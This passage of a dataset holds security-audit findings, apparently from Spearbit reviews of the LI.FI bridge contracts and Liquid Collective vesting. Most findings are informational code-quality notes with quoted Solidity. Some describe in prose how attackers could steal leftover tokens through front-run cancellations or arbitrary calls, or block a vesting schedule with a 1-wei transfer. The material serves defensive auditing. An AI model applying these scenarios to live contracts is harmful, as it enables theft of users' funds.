ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, ReentrancyGuard { is ILiFi, ReentrancyGuard, Swapper { is ILiFi, ReentrancyGuard, SwapperV2 { is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi {", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Catch potential revert in swapAndStartBridgeTokensViaStargate()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The following statement nativeFee -= _swapData[i].fromAmount; can revert in the swapAnd- StartBridgeTokensViaStargate(). function swapAndStartBridgeTokensViaStargate(...) ... { ... for (uint8 i = 0; i < _swapData.length; i++) { if (LibAsset.isNativeAsset(_swapData[i].sendingAssetId)) { nativeFee -= _swapData[i].fromAmount; // can revert } } ... }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "No need to use library If It is in the same file", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "On the LibAsset, some of the functions are called through LibAsset., however there is no need to call because the functions are in the same solidity file. ... ... if (msg.value != 0) revert NativeValueWithERC(); uint256 _fromTokenBalance = LibAsset.getOwnBalance(tokenId); LibAsset.transferFromERC20(tokenId, msg.sender, address(this), amount); if (LibAsset.getOwnBalance(tokenId) - _fromTokenBalance != amount) revert InvalidAmount();", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Combined Optimism and Synthetix bridge", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The Optimism bridge also includes a specific bridge for Synthetix tokens. Perhaps it is more clear to have a seperate Facet for this. function _startBridge(...) ... { ... if (_bridgeData.isSynthetix) { bridge.depositTo(_bridgeData.receiver, _amount); } else { ... } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Doublecheck the Diamond pattern", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The LiFi protocol uses the diamond pattern. This pattern is relative complex and has overhead for the delegatecall. There is not much synergy between the different bridges (except for access controls & white lists). By combining all the bridges in one contract, the risk of one bridge might have an influence on another bridge.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Reference Diamond standard", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The LiFiDiamond.sol contract doesnt contain a reference to the Diamond contract. Having that would make it easier for readers of the code to find the origin of the contract.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Validate Nxtp InvariantTransactionData", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "During the code review, It has been noticed that InvariantTransactionDatas fields are not validated. Even if the validation located in the router, sendingChainFallback and receivingAddress parameters are sensible and connext does not have meaningful error message on these parameter validation. Also, router parameter does not have any validation. Most of the other facets have. For instance : Amarok Facet Note: also see issue \"Hardcode bridge addresses via immutable\" function _startBridge(NXTPData memory _nxtpData) private returns (bytes32) { ITransactionManager txManager = ITransactionManager(_nxtpData.nxtpTxManager); IERC20 sendingAssetId = IERC20(_nxtpData.invariantData.sendingAssetId); // Give Connext approval to bridge tokens LibAsset.maxApproveERC20(IERC20(sendingAssetId), _nxtpData.nxtpTxManager, _nxtpData.amount); uint256 value = LibAsset.isNativeAsset(address(sendingAssetId)) ? _nxtpData.amount : 0; // Initiate bridge transaction on sending chain ITransactionManager.TransactionData memory result = txManager.prepare{ value: value }( ITransactionManager.PrepareArgs( _nxtpData.invariantData, _nxtpData.amount, _nxtpData.expiry, _nxtpData.encryptedCallData, _nxtpData.encodedBid, _nxtpData.bidSignature, _nxtpData.encodedMeta ) ); return result.transactionId; }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Executor contract should not handle cross-chain swap from Connext", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The Executor contract is designed to handle a swap at the destination chain. The LIFI protocol may build a cross-chain transaction to call Executor.swapAndCompleteBridgeTokens at the destination chain. In order to do a flexible swap, the Executor can perform arbitrary execution. Executor.sol#L323-L333 57 function _executeSwaps( LiFiData memory _lifiData, LibSwap.SwapData[] calldata _swapData, address payable _receiver ) private noLeftovers(_swapData, _receiver) { for (uint256 i = 0; i < _swapData.length; i++) { if (_swapData[i].callTo == address(erc20Proxy)) revert UnAuthorized(); // Prevent calling ,! ERC20 Proxy directly LibSwap.SwapData calldata currentSwapData = _swapData[i]; LibSwap.swap(_lifiData.transactionId, currentSwapData); } } However, the receiver address is a privileged address in some bridging services. Allowing users to do arbitrary execution/ external calls is dangerous. The Connext protocol is an example : Connext contractAPI#cancel The receiver address can prematurely cancel a cross-chain transaction. When a cross-chain execution is canceled, the funds would be sent to the fallback address without executing the external call. Exploiters can front-run a gelato relayer and cancel a cross-chain execution. The (post-swap) tokens will be sent to the receivers address. The exploiters can grab the tokens left in the Executor in the same transaction.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Avoid using strings in the interface of the Axelar Facet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The Axelar Facet uses strings to indicate the destinationChain, destinationAddress, which is different then on other bridge facets. function executeCallWithTokenViaAxelar( string memory destinationChain, string memory destinationAddress, string memory symbol, ... ) ...{ } The contract address is (or at least can be) encoded as a hex string, as seen in this example: /// https://etherscan.io/tx/0x7477d550f0948b0933cf443e9c972005f142dfc5ef720c3a3324cefdc40ecfa2 # 0 1 2 3 4 Type Name destinationChain string destinationContractAddress payload symbol amount bytes string uint256 50000000 0xA57ADCE1d2fE72949E4308867D894CD7E7DE0ef2 Data binance string USDC 58 The Axelar bridge allows bridging to non EVM chains, however the LiFi protocol doesnt seem to support thus. So its good to prevent accidentally sending to non EVM chains. Here are the supported non EVM chains: non-evm- networks The Axelar interface doesnt have a (compatible) emit.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Hardcode source Nomad domain ID via immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "AmarokFacet takes source domain ID as a user parameter and passes it to the bridge: originDomain: _bridgeData.srcChainDomain User provided can be incorrect, and Connext will later revert the transaction. See BridgeFacet.sol#L319-L321: if (_args.params.originDomain != s.domain) { revert BridgeFacet__xcall_wrongDomain(); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Amount swapped not emitted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The emits LiFiTransferStarted() and LiFiTransferCompleted() dont emit the amount after the swap (e.g. the real amount that is being bridged / transferred to the receiver). This might be useful to add. 59 event LiFiTransferStarted( bytes32 indexed transactionId, string bridge, string bridgeData, string integrator, address referrer, address sendingAssetId, address receivingAssetId, address receiver, uint256 amount, uint256 destinationChainId, bool hasSourceSwap, bool hasDestinationCall ); event LiFiTransferCompleted( bytes32 indexed transactionId, address receivingAssetId, address receiver, uint256 amount, uint256 timestamp );", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Comment is not compatible with code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "On the HyphenFacet, Comment is mentioned that approval is given to Anyswap. But, approval is given to Hyphen router. function _startBridge(HyphenData memory _hyphenData) private { // Check chain id if (block.chainid == _hyphenData.toChainId) revert CannotBridgeToSameNetwork(); if (_hyphenData.token != address(0)) { // Give Anyswap approval to bridge tokens LibAsset.maxApproveERC20(IERC20(_hyphenData.token), _hyphenData.router, _hyphenData.amount); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Move whitelist to LibSwap.swap()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function LibSwap.swap() is dangerous because it can call any function of any contract. If this is exposed to the outside (like in GenericBridgeFacet), is might enable access to transferFrom() and thus stealing tokens. Also see issue \"Too generic calls in GenericBridgeFacet allow stealing of tokens\" Luckily most of the time LibSwap.swap() is called via _executeSwaps(), which has a whitelist and reduces the risk. To improve security it would be better to integrate the whitelists in LibSwap.swap(). Note: also see issue \"_executeSwaps of Executor.sol doesnt have a whitelist\" library LibSwap { function swap(bytes32 transactionId, SwapData calldata _swapData) internal { if (!LibAsset.isContract(_swapData.callTo)) revert InvalidContract(); ... (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue ,! }(_swapData.callData); ... } } contract SwapperV2 is ILiFi { function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); LibSwap.swap(_lifiData.transactionId, currentSwapData); } } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Redundant check on the HyphenFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In the HyphenFacet, there is a condition which checks source chain is different than destination chain id. However, the conditional check is already placed on the Hyphen contracts. _depositErc20, _depositNative) function _startBridge(HyphenData memory _hyphenData) private { // Check chain id if (block.chainid == _hyphenData.toChainId) revert CannotBridgeToSameNetwork(); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Check input amount equals swapped amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The bridge functions dont check that input amount ( _bridgeData.amount or msg.value) is equal to the swapped amount (_swapData[0].fromAmount). This could lead to funds remaining in the LiFi Diamond or Executor. Luckily noLeftovers() or checks on startingBalance solve this by sending the remaining balance to the origina- tor or receiver. However this is fixing symptoms instead of preventing the issue. function swapAndStartBridgeTokensViaOmniBridge( ... LibSwap.SwapData[] calldata _swapData, BridgeData calldata _bridgeData ) ... { ... uint256 amount = _executeAndCheckSwaps(_lifiData, _swapData, payable(msg.sender)); ... }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Use same layout for facets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The different bridge facets use different layouts for the source code. This can be seen at the call to _startBridge(). The code is easier to maintain If it is the same everywhere. 62 AmarokFacet.sol: ArbitrumBridgeFacet.sol: OmniBridgeFacet.sol: OptimismBridgeFacet.sol: PolygonBridgeFacet.sol: StargateFacet.sol: AcrossFacet.sol: CBridgeFacet.sol: GenericBridgeFacet.sol: GnosisBridgeFacet.sol: HopFacet.sol: HyphenFacet.sol: NXTPFacet.sol: AnyswapFacet.sol: WormholeFacet.sol: AxelarFacet.sol: _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, true); _startBridge(_stargateData, _lifiData, nativeFee, true); _startBridge(_acrossData); _startBridge(_cBridgeData); _startBridge(_bridgeData); _startBridge(gnosisBridgeData); _startBridge(_hopData); _startBridge(_hyphenData); _startBridge(_nxtpData); _startBridge(_anyswapData, underlyingToken, isNative); _startBridge(_wormholeData); // no _startBridge", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Safety check is missing on the remaining amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "On the FeeCollector contract, There is no safety check to ensure remaining amount doesnt under- flow and revert. function collectNativeFees( uint256 integratorFee, uint256 lifiFee, address integratorAddress ) external payable { ... ... } uint256 remaining = msg.value - (integratorFee + lifiFee);", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Entire struct can be emitted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The emit LiFiTransferStarted() generally outputs the entire struct _lifiData by specifying all Its also possible to emit the entire struct in one go. This would make the code smaller and fields of the struct. easier to maintain. function _startBridge(LiFiData calldata _lifiData, ... ) ... { ... // do actions emit LiFiTransferStarted( _lifiData.transactionId, \"omni\", \"\", _lifiData.integrator, _lifiData.referrer, _lifiData.sendingAssetId, _lifiData.receivingAssetId, _lifiData.receiver, _lifiData.amount, _lifiData.destinationChainId, _hasSourceSwap, false ); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Redundant return value from internal function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Callers of NXTPFacet._startBridge() function never use its return value.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Change comment on the LibAsset", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The following comment is used in the LibAsset.sol contract. However, Connext doesnt have this file anymore and deleted with the following commit. /// @title LibAsset /// @author Connext <support@connext.network> /// @notice This library contains helpers for dealing with onchain transfers /// /// library LibAsset {} of assets, including accounting for the native asset `assetId` conventions and any noncompliant ERC20 transfers", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Integrate all variants of _executeAndCheckSwaps()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "There are multiple functions that are more or less the same:  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  _executeAndCheckSwaps() of SwapperV2.sol  _executeAndCheckSwaps() of Swapper.sol  swapAndCompleteBridgeTokens() of XChainExecFacet As these are important functions it is worth the trouble to have one code base to maintain. For example swapAnd- CompleteBridgeTokens() doesnt check msg.value ==0 when ERC20 tokens are send. Note: swapAndCompleteBridgeTokensViaStargate() of StargateFacet.sol already uses SwapperV2.sol", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Utilize NATIVE_ASSETID constant from LibAsset", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In the codebase, LibAsset library contains the variable which defines zero address. However, on the facets the check is repeated. Code should not be repeated and its better to have one version used everywhere to reduce likelihood of bugs. contract AcrossFacet { address internal constant ZERO_ADDRESS = 0x0000000000000000000000000000000000000000; } contract DexManagerFacet { if (_dex == 0x0000000000000000000000000000000000000000) } contract WithdrawFacet { address private constant NATIVE_ASSET = 0x0000000000000000000000000000000000000000; ... } address sendTo = (_to == address(0)) ? msg.sender : _to;", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Native matic will be treated as ERC20 token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "LiFi supports Polygon on their implementation. However, Native MATIC on the Polygon has the contract 0x0000000000000000000000000000000000001010 address. Even if, It does not pose any risk, Native Matic will be treated as an ERC20 token. contract WithdrawFacet { address private constant NATIVE_ASSET = 0x0000000000000000000000000000000000000000; // address(0) ...", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Multiple versions of noLeftovers modifier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The modifier noLeftovers is defined in 3 different files: Swapper.sol, SwapperV2.sol and Ex- ecutor.sol. While the versions on Swapper.sol and Executor.sol are the same, they differ with the one in Executor.sol. Assuming the recommendation for \"Processing of end balances\" is followed, the only difference is that noLeftovers in SwapperV2.sol doesnt revert when new balance is less than initial balance. Code should not be repeated and its better to have one version used everywhere to reduce likelihood of bugs.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Reduce unchecked scope", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Both zapIn() functions in FusePoolZap.sol operate in unchecked block which means any contained arithmetic can underflow or overflow. Currently, it effects only one line in both functions:  FusePoolZap.sol#L67: uint256 mintAmount = IERC20(address(fToken)).balanceOf(address(this)) - preMintBalance;  FusePoolZap.sol#L104 mintAmount = mintAmount - preMintBalance; Having unchecked for such a large scope when it is applicable to only one line is dangerous.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "No event exists for core paths/functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Several key actions are defined without event declarations. Owner only functions that change critical parameters can emit events to record these changes on-chain for off-chain monitors/tools/interfaces. There are 4 instances of this issue: 67 contract PeripheryRegistryFacet { function registerPeripheryContract(...) ... { } } contract LibAccess { function addAccess(...) ... { } function removeAccess(...) ... { } } contract AccessManagerFacet { function setCanExecute(...) ... { } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Rename _receiver to _leftoverReceiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In the contracts Swapper.sol, SwapperV2.sol and Executor.sol the parameter _receiver is used in various places. Its name seems to suggest that the result of the swapped tokens are send to the _receiver, however this is not the case. Instead the left over tokens are send to the _receiver. This makes the code more difficult to read and maintain. contract SwapperV2 is ILiFi { modifier noLeftovers(..., address payable _receiver) { ... } function _executeAndCheckSwaps(..., address payable _receiver) ... { ... } function _executeSwaps(..., address payable _receiver) ... { ... } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Native tokens dont need SwapData.approveTo", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The functions _executeSwaps() of both SwapperV2.sol and Swapper.sol use a whitelist to make sure the right functions in the allowed dexes are called. These checks also include a check on approveTo, however approveTo is not relevant when a native token is being used. Currently the caller of the Lifi Diamond has to specify a whitelisted currentSwapData.approveTo to be able to execute _executeSwaps() which doesnt seem logical. Present in both SwapperV2.sol and Swapper.sol: function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); LibSwap.swap(_lifiData.transactionId, currentSwapData); } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Inaccurate comment on the maxApproveERC20() function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "During the code review, It has been observed that comment is incompatible with the functionality. maxApproveERC20 function approves MAX If asset id does not have sufficient allowance. The comment can be replaced with If a sufficient allowance is not present, the allowance is set to MAX. /// @notice Gives MAX approval for another address to spend tokens /// @param assetId Token address to transfer /// @param spender Address to give spend approval to /// @param amount Amount to approve for spending function maxApproveERC20( IERC20 assetId, address spender, uint256 amount )", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Undocumented contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "All systematic contracts are documented on the docs directory. However, several contracts are not documented. LiFi is integrated with third party platforms through API. To understand code functionality, the related contracts should be documented in the directory.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Utilize built-in library function on the address check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In the codebase, LibAsset library contains the function which determines whether the given assetId is the native asset. However, this check is not used and many of the other contracts are applying address check seperately. contract AmarokFacet { function startBridgeTokensViaAmarok(...) ... { ... if (_bridgeData.assetId == address(0)) ... } function swapAndStartBridgeTokensViaAmarok(... ) ... { ... if (_bridgeData.assetId == address(0)) ... } } contract AnyswapFacet { function swapAndStartBridgeTokensViaAnyswap(...) ... { ... if (_anyswapData.token == address(0)) revert TokenAddressIsZero(); ... } } contract HyphenFacet { function _startBridge(...) ... { ... if (_hyphenData.token != address(0)) ... } } contract StargateFacet { function _startBridge(...) ... { ... if (token == address(0)) ... 70 } } contract LibAsset { function transferFromERC20(...) ... { ... if (assetId == NATIVE_ASSETID) revert NullAddrIsNotAnERC20Token(); ... } function transferAsset(...) ... { ... (assetId == NATIVE_ASSETID) ... } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Consider using wrapped native token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The code currently supports bridging native tokens. However this has the following drawbacks:  not every bridge supports native tokens;  native tokens have an inherent risk of reentrancy;  native tokens introduce additional code paths, which is more difficult to maintain and results in a higher risk of bugs. Also wrapped tokens are more composable. This is also useful for bridges that currently dont support native tokens like the AxelarFacet, the WormholeFacet, and the StargateFacet.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Incorrect event emitted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Li.fi follows a two-step ownership transfer pattern, where the current owner first proposes an address to be the new owner. Then that address accepts the ownership in a different transaction via confirmOwnership- Transfer(): function confirmOwnershipTransfer() external { if (msg.sender != pendingOwner) revert NotPendingOwner(); owner = pendingOwner; pendingOwner = LibAsset.NULL_ADDRESS; emit OwnershipTransferred(owner, pendingOwner); } At the time of emitting OwnershipTransferred, pendingOwner is always address(0) and owner is the new owner. This event should be used to log the addresses between which the ownership transfer happens.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "If statement does not check mintAmount properly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "On the zapIn function, mintAmount is checked with the following If statement. However, It is directly getting contract balance instead of taking difference between mintAmount and preMintBalance. ... ... uint256 mintAmount = IERC20(address(fToken)).balanceOf(address(this)); if (!success && mintAmount == 0) { revert MintingError(res); } mintAmount = mintAmount - preMintBalance;", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Use address(0) for zero address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Its better to use shorthands provided by Solidity for popular constant values to improve readability and likelihood of errors. address internal constant NULL_ADDRESS = 0x0000000000000000000000000000000000000000; //address(0)", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Better variable naming", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "MAX_INT is defined to be the maximum value of uint256 data type: uint256 private constant MAX_INT = type(uint256).max; This variable name can be interpreted as the maximum value of int256 data type which is lower than type(uint256).max.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Event is missing indexed fields", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Index event fields make the field more quickly accessible to off-chain tools that parse events. How- ever, note that each index field costs extra gas during emission, so its not necessarily best to index the maximum allowed per event (three fields).", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Remove misleading comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "WithdrawFacet.sol has the following misleading comment which can be removed. Its unclear why this comment was made. address self = address(this); // workaround for a possible solidity bug", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Redundant events/errors/imports on the contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "During the code review, It has been observed that several events and errors are not used in the contracts. With the deleting redundant events and errors, gas can be saved.  FusePoolZap.sol#L28 - CannotDepositNativeToken  GenericSwapFacet.sol#L7 - ZeroPostSwapBalance  WormholeFacet.sol#L12 - InvalidAmount and InvalidConfig  HyphenFacet.sol#L32 - HyphenInitialized  HyphenFacet.sol#L9 - InvalidAmount and InvalidConfig  HopFacet.sol#L9 - InvalidAmount, InvalidConfig and InvalidBridgeConfigLength  HopFacet.sol#L36- HopInitialized  PolygonBridgeFacet.sol#L28 - InvalidConfig  Executor.sol#L5 - IAxelarGasService  AcrossFacet.sol#L37 - UseWethInstead, InvalidAmount, NativeValueWithERC, InvalidConfig  NXTPFacet.sol#L9 - InvalidAmount, NativeValueWithERC, NoSwapDataProvided, InvalidConfig", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "forceSlow option is disabled on the AmarokFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "On the AmarokFacet contract, forceSlow option is disabled. According to documentation, forceS- low is an option that allows users to take the Nomad slow path (~30 mins) instead of paying routers a 0.05% fee on their transaction. ... IConnextHandler.XCallArgs memory xcallArgs = IConnextHandler.XCallArgs({ params: IConnextHandler.CallParams({ to: _bridgeData.receiver, callData: _bridgeData.callData, originDomain: _bridgeData.srcChainDomain, destinationDomain: _bridgeData.dstChainDomain, agent: _bridgeData.receiver, recovery: msg.sender, forceSlow: false, receiveLocal: false, callback: address(0), callbackFee: 0, relayerFee: 0, slippageTol: _bridgeData.slippageTol }), transactingAssetId: _bridgeData.assetId, amount: _amount }); ...", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Incomplete NatSpec", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Some functions are missing @param for some of their parameters. Given that NatSpec is an impor- tant part of code documentation, this affects code comprehension, auditability and usability.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Use nonReentrant modifier in a consistent way", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "AxelarFacet, zapIn of the contract FusePoolZap and completeBridgeTokensViaStargate() - swapAndCom- pleteBridgeTokensViaStargate of the StargateFacet dont have a nonReentrant modifier. All other facets that integrate with the external contract do have this modifier. executeCallWithTokenViaAxelar of contract AxelarFacet { function executeCallWithTokenViaAxelar(...) ... { } function executeCallViaAxelar(...) ... { } } contract FusePoolZap { function zapIn(...) ... { } } There are 2 versions of sgReceive() / completeBridgeTokensViaStargate() which use different locations for nonReentrant. The makes the code more difficult to maintain and verify. contract StargateFacet is ILiFi, SwapperV2, ReentrancyGuard { function sgReceive(...) external nonReentrant { ... this.swapAndCompleteBridgeTokensViaStargate(lifiData, swapData, assetId, receiver); ... } function completeBridgeTokensViaStargate(...) external { ... } } contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function sgReceive(...) external { ... this.swapAndCompleteBridgeTokensViaStargate(lifiData, swapData, assetId, payable(receiver)); ... } function swapAndCompleteBridgeTokensViaStargate(...) external payable nonReentrant { } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Typos on the codebase", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Across the codebase, there are typos on the comments.  cancelOnwershipTransfer -> cancelOwnershipTransfer.  addresss -> address.  Conatains -> Contains.  Intitiates -> Initiates.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Store all error messages in GenericErrors.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The file GenericErrors.sol contains several error messages and is used from most other solidity files. However several other error messages are defined in the solidity files themselves. It would be more con- sistent and easier to maintain to store these in GenericErrors.sol as well. Note: the Periphery contract also contains error messages which are not listed below. Here are the error messages contained in the solidity files: Facets/AcrossFacet.sol:37: Facets/AmarokFacet.sol:31: Facets/ArbitrumBridgeFacet.sol:30: Facets/GnosisBridgeFacet.sol:31: Facets/GnosisBridgeFacet.sol:32: Facets/OmniBridgeFacet.sol:27: Facets/OptimismBridgeFacet.sol:29: Facets/OwnershipFacet.sol:20: Facets/OwnershipFacet.sol:21: Facets/OwnershipFacet.sol:22: Facets/OwnershipFacet.sol:23: Facets/PolygonBridgeFacet.sol:28: Facets/PolygonBridgeFacet.sol:29: Facets/StargateFacet.sol:39: Facets/StargateFacet.sol:40: Facets/StargateFacet.sol:41: Facets/WithdrawFacet.sol:20: Facets/WithdrawFacet.sol:21: Helpers/ReentrancyGuard.sol:20: Libraries/LibAccess.sol:18: Libraries/LibSwap.sol:9: error UseWethInstead(); error InvalidReceiver(); error InvalidReceiver(); error InvalidDstChainId(); error InvalidSendingToken(); error InvalidReceiver(); error InvalidReceiver(); error NoNullOwner(); error NewOwnerMustNotBeSelf(); error NoPendingOwnershipTransfer(); error NotPendingOwner(); error InvalidConfig(); error InvalidReceiver(); error InvalidConfig(); error InvalidStargateRouter(); error InvalidCaller(); error NotEnoughBalance(uint256 requested, uint256 available); error WithdrawFailed(); error ReentrancyError(); error UnAuthorized(); error NoSwapFromZeroBalance();", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "A malicious user could DOS a vesting schedule by sending only 1 wei of TLC to the vesting escrow address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "An external user who owns some TLC tokens could DOS the vesting schedule of any user by sending just 1 wei of TLC to the escrow address related to the vesting schedule. By doing that:  The creator of the vesting schedule will not be able to revoke the vesting schedule.  The beneficiary of the vesting schedule will not be able to release any vested tokens until the end of the vesting schedule.  Any external contracts or dApps will not be able to call computeVestingReleasableAmount . In practice, all the functions that internally call _computeVestingReleasableAmount will revert because of an un- 